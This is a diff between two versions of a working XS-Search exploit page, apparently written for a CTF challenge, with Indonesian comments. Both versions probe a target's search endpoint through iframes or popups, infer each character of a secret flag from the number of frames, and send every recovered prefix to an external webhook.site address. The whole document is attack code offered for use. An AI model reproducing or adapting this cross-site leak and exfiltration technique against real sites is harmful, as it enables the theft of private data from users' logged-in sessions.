@@ -1,82 +1,82 @@
-```html
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit - XS-Search</title>
+</head>
 <body>
-<h2>Loading...</h2>
+    <h1 id="status">Siphoning Flag...</h1>
+    <div id="log"></div>
 
-<script>
-const TARGET = "https://wonder.cbd2026.cloud";
-const WEBHOOK = "https://webhook.site/a0c938c2-b011-4cc8-ad8a-4691d5a93094";
-const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()";
-let flag = "CBC{";
+    <script>
+        // Konfigurasi berdasarkan input kamu
+        const TARGET = 'https://wonder.cbd2026.cloud';
+        const WEBHOOK = 'https://webhook.site/a0c938c2-b011-4cc8-ad8a-4691d5a93094';
+        
+        // Karakter yang mungkin ada di dalam flag
+        const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$}{';
+        
+        // Prefix flag (berdasarkan pola Waskita CTF sebelumnya)
+        let knownFlag = 'CBC{'; 
 
-async function sleep(ms){
-  return new Promise(r => setTimeout(r, ms));
-}
+        async function leak(query) {
+            return new Promise((resolve) => {
+                // Membuka jendela baru agar cookie SameSite=Lax tetap terkirim
+                let win = window.open(`${TARGET}/search?q=${encodeURIComponent(query)}`);
+                
+                // Tunggu sebentar hingga halaman Search me-render iframe preview
+                setTimeout(() => {
+                    try {
+                        // Jika hasil ditemukan, search.php merender 1 iframe.
+                        // window.length akan bernilai > 0 jika ada iframe di dalamnya.
+                        const found = win.length > 0;
+                        win.close();
+                        resolve(found);
+                    } catch (e) {
+                        // Jika terjadi error (misal window sudah tertutup atau diblok)
+                        if (win) win.close();
+                        resolve(false);
+                    }
+                }, 750); // Jeda 750ms (sesuaikan dengan kecepatan server)
+            });
+        }
 
-async function testPrefix(prefix){
-  return new Promise((resolve) => {
-    let f = document.createElement("iframe");
-    f.style.display = "none";
+        async function startSiphoning() {
+            document.getElementById('log').innerHTML += `<p>Starting with: <b>${knownFlag}</b></p>`;
+            
+            while (!knownFlag.endsWith('}')) {
+                let foundChar = false;
+                
+                for (let char of CHARSET) {
+                    let attempt = knownFlag + char;
+                    
+                    if (await leak(attempt)) {
+                        knownFlag += char;
+                        foundChar = true;
+                        
+                        // Kirim progres ke webhook kamu secara real-time
+                        fetch(`${WEBHOOK}?found=${encodeURIComponent(knownFlag)}`);
+                        
+                        // Update tampilan di halaman eksploit
+                        document.getElementById('log').innerHTML += `<p>Matched: <b>${knownFlag}</b></p>`;
+                        break;
+                    }
+                }
+                
+                // Jika tidak ada karakter yang cocok, hentikan agar tidak looping selamanya
+                if (!foundChar) {
+                    fetch(`${WEBHOOK}?status=failed&last_seen=${encodeURIComponent(knownFlag)}`);
+                    document.getElementById('status').innerText = "Siphoning Failed/Finished";
+                    break;
+                }
+            }
+            
+            document.getElementById('status').innerText = "Flag Captured!";
+        }
 
-    f.onload = async () => {
-      await sleep(1200);
-
-      let ok = false;
-
-      try {
-        // jika hasil pencarian punya iframe preview pdf
-        ok = f.contentWindow.length > 0;
-      } catch(e){
-        ok = false;
-      }
-
-      f.remove();
-      resolve(ok);
-    };
-
-    f.src = TARGET + "/search?q=" + encodeURIComponent(prefix);
-    document.body.appendChild(f);
-  });
-}
-
-async function exfil(data){
-  fetch(WEBHOOK + "?flag=" + encodeURIComponent(data)).catch(()=>{});
-}
-
-async function run(){
-  await exfil("START:" + flag);
-
-  while(!flag.endsWith("}")){
-    let found = false;
-
-    for(let c of CHARS){
-      let guess = flag + c;
-
-      document.body.innerHTML = "<h2>Trying: " + guess + "</h2>";
-
-      let ok = await testPrefix(guess);
-
-      if(ok){
-        flag += c;
-        await exfil(flag);
-        found = true;
-        break;
-      }
-    }
-
-    if(!found){
-      await exfil("FAILED_AT:" + flag);
-      break;
-    }
-  }
-
-  await exfil("DONE:" + flag);
-  document.body.innerHTML = "<h1>" + flag + "</h1>";
-}
-
-run();
-</script>
+        // Jalankan serangan setelah halaman dimuat
+        // Pastikan bot admin mengizinkan Pop-up
+        startSiphoning();
+    </script>
 </body>
 </html>
-```
